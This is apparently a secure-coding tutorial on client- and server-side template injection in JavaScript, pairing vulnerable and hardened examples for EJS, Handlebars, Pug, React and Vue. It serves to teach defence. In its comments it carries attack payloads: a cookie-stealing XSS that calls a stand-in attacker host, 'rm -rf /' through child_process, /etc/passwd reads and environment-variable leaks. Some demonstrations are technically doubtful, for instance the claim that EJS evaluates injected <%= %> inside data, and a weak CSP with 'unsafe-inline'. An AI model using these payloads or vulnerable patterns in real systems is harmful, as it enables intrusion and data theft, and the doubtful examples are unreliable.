# HTML Template Injection in JavaScript

## Definition

HTML Template Injection is a vulnerability that occurs when user-controlled input is evaluated as code within a templating engine. This can manifest as Client-Side Template Injection (CSTI) in the browser or Server-Side Template Injection (SSTI) on the server. Template injection allows attackers to execute arbitrary code or access sensitive data by injecting template syntax that gets processed by the engine.

## Client-Side Template Injection (CSTI)

Client-side template injection occurs in the browser when user input is processed by a client-side templating library without proper escaping.

### Common Client-Side Templating Engines

- **AngularJS** - `{{ }}` syntax for expressions
- **Vue.js** - `{{ }}` and `v-html` directives
- **Handlebars** - `{{ }}` and `{{{ }}}` for HTML
- **Mustache** - `{{ }}` for interpolation
- **EJS** - `<%= %>` and `<%- %>` tags
- **Pug** - Various directives and interpolation

### Example: AngularJS CSTI

```javascript
// Vulnerable AngularJS template
<div ng-app>
  <p>User message: {{ userInput }}</p>
</div>

// If userInput contains: {{7*7}}
// AngularJS evaluates it and displays: 49

// More dangerous: {{constructor.prototype.toString()}}
// This can access JavaScript internals
```

### Example: Vue.js CSTI

```javascript
// Vulnerable Vue.js component
<template>
  <div>
    <p>Welcome: {{ userInput }}</p>
  </div>
</template>

<script>
export default {
  data() {
    return {
      userInput: this.$route.query.message
    }
  }
}
</script>

// If userInput = {{this.$root.constructor}}
// Vue evaluates the expression and exposes Vue internals
```

## Server-Side Template Injection (SSTI)

Server-side template injection occurs when user input is embedded into a template file and processed by a server-side templating engine.

### Example: Express with EJS

```javascript
const express = require('express');
const app = express();

app.set('view engine', 'ejs');

// VULNERABLE: User input directly embedded in template
app.get('/greet', (req, res) => {
  const name = req.query.name;
  res.render('greet', { name: name });
});

// greet.ejs template:
// <h1>Hello <%= name %></h1>
//
// Normal input: "John"
// Output: <h1>Hello John</h1>
//
// Malicious input: "<%= 7*7 %>"
// Output: <h1>Hello 49</h1>
```

### Example: Handlebars SSTI

```javascript
const handlebars = require('handlebars');
const express = require('express');
const app = express();

// VULNERABLE: User input compiled as template
app.post('/render', (req, res) => {
  const userTemplate = req.body.template;
  const data = req.body.data;

  // CRITICAL VULNERABILITY: Compiling user input as template
  const template = handlebars.compile(userTemplate);
  const result = template(data);

  res.send(result);
});

// Attack payload in userTemplate:
// {{#with (7*7)}}{{.}}{{/with}}
// Result: 49 is rendered
```

### Example: Pug/Jade SSTI

```javascript
const pug = require('pug');

// VULNERABLE: User input in template string
const userInput = req.query.message;
const template = `
  div
    p Message: #{userInput}
    each item in items
      li= item
`;

const html = pug.render(template, {
  userInput: userInput,
  items: ['a', 'b', 'c']
});

// If userInput contains: "#{7*7}"
// Pug evaluates it as code
```

## How SSTI Leads to Remote Code Execution (RCE)

SSTI vulnerabilities can escalate to Remote Code Execution through various methods depending on the template engine:

### 1. JavaScript Execution via Handlebars

```javascript
const handlebars = require('handlebars');

// Vulnerable code
const userTemplate = req.body.template;
const template = handlebars.compile(userTemplate);

// Attack: Access Function constructor
const payload = `{{#with (this.constructor)}}
  {{#with (prototype)}}
    {{#with (constructor('return process.env')())}}
      {{this}}
    {{/with}}
  {{/with}}
{{/with}}`;

// This could leak environment variables or execute code
```

### 2. RCE via Template Injection in Pug

```javascript
const pug = require('pug');

// VULNERABLE: User input directly in template
const userInput = req.query.data;
const template = `
  - var x = '${userInput}'
  p= x
`;

const html = pug.render(template);

// Attack payload in userInput:
// '; require('child_process').exec('rm -rf /'); //'
// This would execute shell commands on the server
```

### 3. Data Access via Template Engine Introspection

```javascript
// Attack accessing file system through template engine
const payload = `
{{#with (lookup this "constructor")}}
  {{#with (lookup (lookup this "prototype") "constructor")}}
    {{#with (call this "require" "fs")}}
      {{call this "readFileSync" "/etc/passwd" "utf8"}}
    {{/with}}
  {{/with}}
{{/with}}
`;
```

## Vulnerable Code Examples

### 1. Vulnerable EJS Implementation

```javascript
const express = require('express');
const ejs = require('ejs');
const app = express();

app.use(express.json());

// VULNERABLE: User input directly embedded in template string
app.post('/vulnerable/render', (req, res) => {
  const userInput = req.body.content;

  // VULNERABLE: Using res.render with template-like content
  const template = `
    <div class="content">
      <h1><%= title %></h1>
      <p><%= userInput %></p>
    </div>
  `;

  ejs.render(template, { userInput: userInput }, (err, result) => {
    if (err) return res.status(500).send(err);
    res.send(result);
  });
});

// Attack: POST /vulnerable/render with:
// {"content": "<%= require('child_process').exec('whoami') %>"}
```

### 2. Vulnerable Handlebars Implementation

```javascript
const express = require('express');
const handlebars = require('handlebars');
const app = express();

app.use(express.json());

// VULNERABLE: Compiling user input as template
app.post('/vulnerable/template', (req, res) => {
  const userTemplate = req.body.template;
  const data = req.body.data || {};

  try {
    // CRITICAL: Compiling user-supplied template
    const template = handlebars.compile(userTemplate);
    const result = template(data);
    res.send(result);
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// Attack: POST /vulnerable/template with:
// {
//   "template": "{{#with (this.constructor)}}{{#with (prototype)}}{{#with (constructor('return this')())}}{{this.global}}{{/with}}{{/with}}{{/with}}"
// }
```

### 3. Vulnerable Pug Implementation

```javascript
const pug = require('pug');
const express = require('express');
const app = express();

app.use(express.json());

// VULNERABLE: Building template from user input
app.post('/vulnerable/pug-render', (req, res) => {
  const userInput = req.body.content;

  // VULNERABLE: User input in template string
  const template = `
    div
      h1 Generated Content
      p #{userInput}
  `;

  try {
    const html = pug.render(template, {});
    res.send(html);
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// Attack: POST /vulnerable/pug-render with:
// {"content": "'; var x = require('fs').readFileSync('/etc/passwd', 'utf8'); //"}
```

### 4. React dangerouslySetInnerHTML Misuse

```javascript
import React from 'react';

// VULNERABLE: Using dangerouslySetInnerHTML with user input
export default function VulnerableComponent({ userContent }) {
  return (
    <div>
      <h1>User Content</h1>
      <div dangerouslySetInnerHTML={{ __html: userContent }} />
    </div>
  );
}

// Attack: If userContent contains:
// <img src=x onerror="fetch('http://attacker.com/steal?data=' + document.cookie)">
// The XSS payload executes in the browser

// Attack: If userContent contains:
// <script>alert('XSS')</script>
// JavaScript executes (though script tags won't run in dangerouslySetInnerHTML)
// But event handlers will:
// <svg onload="alert('XSS')">
```

### 5. Vulnerable Vue.js Implementation

```javascript
// VULNERABLE: Vue template with user input
export default {
  name: 'VulnerableComponent',
  data() {
    return {
      userInput: this.$route.query.message
    }
  },
  template: `
    <div>
      <h1>Message: {{ userInput }}</h1>
    </div>
  `
}

// Even with Vue's default escaping, some inputs can bypass:
// If userInput = {{constructor.prototype.constructor('alert("XSS")')()}}
// Vue evaluates expressions in {{ }} which could access JavaScript internals
```

## Secure Code Examples

### 1. Secure EJS Implementation

```javascript
const express = require('express');
const ejs = require('ejs');
const app = express();

app.use(express.json());

// SECURE: Using template files with proper escaping
app.post('/secure/render', (req, res) => {
  const userInput = req.body.content;

  // Validation
  if (!userInput || typeof userInput !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  if (userInput.length > 10000) {
    return res.status(400).json({ error: 'Content too large' });
  }

  // SECURE: Use template files, not template strings from user input
  // The template file is stored in the codebase and not user-controlled
  ejs.renderFile('./views/secure-content.ejs',
    { userInput: userInput }, // Data is kept separate from template
    (err, result) => {
      if (err) return res.status(500).send('Error');
      res.send(result);
    });
});

// secure-content.ejs template file:
// <div class="content">
//   <h1>User Message</h1>
//   <p><%= userInput %></p>  <!-- EJS automatically escapes with <%= -->
// </div>
```

### 2. Secure Handlebars Implementation

```javascript
const express = require('express');
const handlebars = require('handlebars');
const fs = require('fs');
const app = express();

app.use(express.json());

// SECURE: Template loaded from file system
const templateSource = fs.readFileSync('./templates/safe-template.hbs', 'utf8');
const template = handlebars.compile(templateSource);

app.post('/secure/template', (req, res) => {
  const data = req.body.data;

  // Validate data is an object with expected structure
  if (!data || typeof data !== 'object') {
    return res.status(400).json({ error: 'Invalid data' });
  }

  // Whitelist allowed properties
  const allowedKeys = ['name', 'title', 'description'];
  const sanitizedData = {};

  for (const key of allowedKeys) {
    if (data[key]) {
      // Ensure strings are strings
      if (typeof data[key] === 'string') {
        sanitizedData[key] = data[key].substring(0, 500); // Limit length
      }
    }
  }

  // SECURE: Using pre-compiled template with validated data
  const result = template(sanitizedData);
  res.send(result);
});

// safe-template.hbs (stored in codebase, not user input):
// <div class="container">
//   <h1>{{name}}</h1>
//   <p>{{title}}</p>
//   <p>{{description}}</p>
// </div>
// Note: Handlebars escapes by default with {{}}
// Use {{{html}}} only for trusted HTML
```

### 3. Secure Pug Implementation

```javascript
const pug = require('pug');
const express = require('express');
const app = express();

app.use(express.json());

// SECURE: Compile template from file at startup
const renderContent = pug.compileFile('./views/secure-pug.pug');

app.post('/secure/pug-render', (req, res) => {
  const userInput = req.body.content;

  // Validate input
  if (!userInput || typeof userInput !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  if (userInput.length > 5000) {
    return res.status(400).json({ error: 'Content too long' });
  }

  // Sanitize: Remove any potential template syntax
  const sanitized = sanitizeInput(userInput);

  // SECURE: Use pre-compiled template with data
  const html = renderContent({ userInput: sanitized });
  res.send(html);
});

function sanitizeInput(input) {
  // Remove template syntax characters
  return input
    .replace(/[#!-]/g, '') // Remove Pug special chars
    .replace(/[{}[\]]/g, '') // Remove bracket chars
    .trim();
}

// secure-pug.pug (stored in codebase):
// div.container
//   h1 User Content
//   p= userInput
```

### 4. Secure React Implementation

```javascript
import React, { useState } from 'react';
import DOMPurify from 'dompurify';

export default function SecureComponent({ userContent }) {
  // SECURE: Sanitize HTML before rendering
  const sanitizedHTML = DOMPurify.sanitize(userContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  });

  return (
    <div>
      <h1>User Content</h1>
      {/* Only use dangerouslySetInnerHTML with sanitized content */}
      <div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />
    </div>
  );
}

// ALTERNATIVE: Use text content instead of HTML
export default function SecureComponentTextOnly({ userContent }) {
  return (
    <div>
      <h1>User Content</h1>
      {/* MOST SECURE: Use text rendering, not HTML */}
      <p>{userContent}</p>
    </div>
  );
}
```

### 5. Secure Vue.js Implementation

```javascript
// SECURE: Vue component with proper data handling
export default {
  name: 'SecureComponent',
  data() {
    return {
      userInput: ''
    }
  },
  mounted() {
    // Get data from route query params
    this.userInput = this.$route.query.message || '';
  },
  template: `
    <div>
      <h1>Message</h1>
      <!-- Vue escapes by default with {{ }} -->
      <p>{{ userInput }}</p>
    </div>
  `
}

// SECURE: If HTML rendering is needed, use sanitizer
<template>
  <div>
    <h1>Rich Content</h1>
    <!-- Use v-text for plain text (safest) -->
    <p v-text="userInput"></p>

    <!-- OR sanitize before using v-html -->
    <div v-html="sanitizedContent"></div>
  </div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  data() {
    return {
      userInput: this.$route.query.message || ''
    }
  },
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.userInput);
    }
  }
}
</script>
```

## Safe Alternatives

### 1. Use Auto-Escaping Templates

Most template engines auto-escape by default:

```javascript
// EJS: <%= %> escapes, <%- %> does not
const html = `<p><%= userInput %></p>`; // SAFE - escaped
const html = `<p><%- userInput %></p>`; // UNSAFE - not escaped

// Handlebars: {{ }} escapes, {{{ }}} does not
const html = `<p>{{userInput}}</p>`; // SAFE - escaped
const html = `<p>{{{userInput}}}</p>`; // UNSAFE - not escaped

// Pug: = escapes, != does not
const html = `p= userInput`; // SAFE - escaped
const html = `p!= userInput`; // UNSAFE - not escaped
```

### 2. Use Sanitization Libraries

```javascript
const DOMPurify = require('isomorphic-dompurify');

// Sanitize HTML before rendering
const sanitized = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'u', 'p', 'br'],
  ALLOWED_ATTR: []
});

// Now safe to render
const html = `<p>${sanitized}</p>`;
```

### 3. Use XSS Protection Middleware

```javascript
const express = require('express');
const helmet = require('helmet');
const app = express();

// Use helmet for security headers
app.use(helmet());

// Custom XSS protection middleware
app.use((req, res, next) => {
  // Set CSP headers
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'"
  );
  next();
});
```

### 4. Store Templates in Files, Not User Input

```javascript
const fs = require('fs');
const handlebars = require('handlebars');

// SECURE: Load templates at startup from file system
const templates = new Map();

function loadTemplates() {
  const templateNames = ['email', 'invoice', 'receipt'];

  templateNames.forEach(name => {
    const source = fs.readFileSync(`./templates/${name}.hbs`, 'utf8');
    templates.set(name, handlebars.compile(source));
  });
}

loadTemplates();

app.post('/render/:templateName', (req, res) => {
  const name = req.params.templateName;

  // Validate template name exists
  if (!templates.has(name)) {
    return res.status(404).json({ error: 'Template not found' });
  }

  const template = templates.get(name);
  const result = template(req.body);
  res.send(result);
});
```

## Best Practices

1. **Never compile user input as templates** - Always store templates in files
2. **Use auto-escaping by default** - Use `<%= %>` or `{{ }}` instead of unescaped variants
3. **Separate templates from data** - Keep template logic separate from user-supplied data
4. **Validate and sanitize input** - Apply whitelist validation and sanitization
5. **Use text rendering when possible** - Prefer rendering plain text over HTML
6. **Implement Content Security Policy** - Use CSP headers to prevent inline script execution
7. **Sanitize HTML output** - Use DOMPurify for any HTML rendering
8. **Limit template file locations** - Ensure templates cannot be loaded from user input
9. **Use security libraries** - Leverage libraries like Helmet.js for XSS protection
10. **Regular security audits** - Test templates for injection vulnerabilities
11. **Keep dependencies updated** - Update template engines for security patches
12. **Avoid dangerouslySetInnerHTML** - Use it sparingly and only with sanitized content

## Complete Secure Implementation

```javascript
const express = require('express');
const ejs = require('ejs');
const DOMPurify = require('isomorphic-dompurify');
const helmet = require('helmet');
const path = require('path');

const app = express();
app.use(express.json());
app.use(helmet()); // Security headers

// Whitelist of allowed templates
const ALLOWED_TEMPLATES = ['email', 'receipt', 'notification'];

app.post('/render/:templateName', (req, res) => {
  const templateName = req.params.templateName;
  const data = req.body;

  // Validate template name
  if (!ALLOWED_TEMPLATES.includes(templateName)) {
    return res.status(400).json({ error: 'Invalid template' });
  }

  // Sanitize all string values in data
  const sanitizedData = {};
  for (const [key, value] of Object.entries(data)) {
    if (typeof value === 'string') {
      sanitizedData[key] = DOMPurify.sanitize(value, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: []
      });
    } else if (typeof value === 'object') {
      sanitizedData[key] = value; // Handle non-strings appropriately
    }
  }

  // Load template from file system
  const templatePath = path.join(__dirname, 'templates', `${templateName}.ejs`);

  ejs.renderFile(templatePath, sanitizedData, (err, html) => {
    if (err) {
      console.error('Template error:', err);
      return res.status(500).json({ error: 'Render failed' });
    }
    res.type('html').send(html);
  });
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
```

## References

- OWASP Server-Side Template Injection: https://owasp.org/www-community/attacks/Server-Side_Template_Injection
- OWASP Client-Side Template Injection: https://owasp.org/www-community/attacks/Client-Side_Template_Injection
- CWE-94: Improper Control of Generation of Code: https://cwe.mitre.org/data/definitions/94.html
- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine: https://cwe.mitre.org/data/definitions/1336.html
- DOMPurify: https://github.com/cure53/DOMPurify
